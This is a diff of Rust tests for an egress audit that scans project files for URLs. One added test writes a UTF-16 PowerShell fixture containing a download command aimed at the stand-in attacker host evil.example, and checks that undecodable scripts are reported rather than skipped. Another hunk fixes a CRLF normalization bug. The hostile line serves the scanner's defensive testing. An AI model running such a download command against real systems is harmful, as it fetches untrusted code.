@@ -71,6 +71,24 @@ fn the_url_scanner_accepts_the_allowlist() {
     assert_eq!(scan.files_scanned, 1);
 }
 
+#[test]
+fn the_url_scanner_reports_unreadable_source_instead_of_skipping_it() {
+    let dir = tempfile::tempdir().expect("temp dir");
+    let path = dir.path().join("fetch.ps1");
+    let mut bytes = vec![0xff, 0xfe];
+    for unit in "Invoke-WebRequest https://evil.example/download".encode_utf16() {
+        bytes.extend_from_slice(&unit.to_le_bytes());
+    }
+    std::fs::write(&path, bytes).expect("write UTF-16 script");
+
+    let error = egress::scan_tree_for_urls(dir.path())
+        .expect_err("a script the audit cannot decode must not yield a clean scan");
+    assert!(
+        error.to_string().contains("fetch.ps1"),
+        "the error must identify the unreadable file: {error:#}",
+    );
+}
+
 /// `http://127.0.0.1` as a prefix also matches `http://127.0.0.1.evil.com`.
 /// AC-21's source half is "no business domain"; a scanner that green-ticks a
 /// lookalike host is worse than no scanner.
@@ -577,7 +595,12 @@ fn a_crlf_checkout_still_matches_the_lock() {
         if entry.file_name() == std::ffi::OsStr::new("schemas.lock.json") {
             continue;
         }
-        let lf = std::fs::read_to_string(&dest).expect("read");
+        // Normalize first: a Windows checkout may already be CRLF, and
+        // `replace('\n', "\r\n")` on CRLF produces `\r\r\n`, which no longer
+        // matches the lock (digest collapses only one `\r\n` pair).
+        let lf = std::fs::read_to_string(&dest)
+            .expect("read")
+            .replace("\r\n", "\n");
         let crlf = lf.replace('\n', "\r\n");
         std::fs::write(&dest, crlf).expect("write crlf");
     }
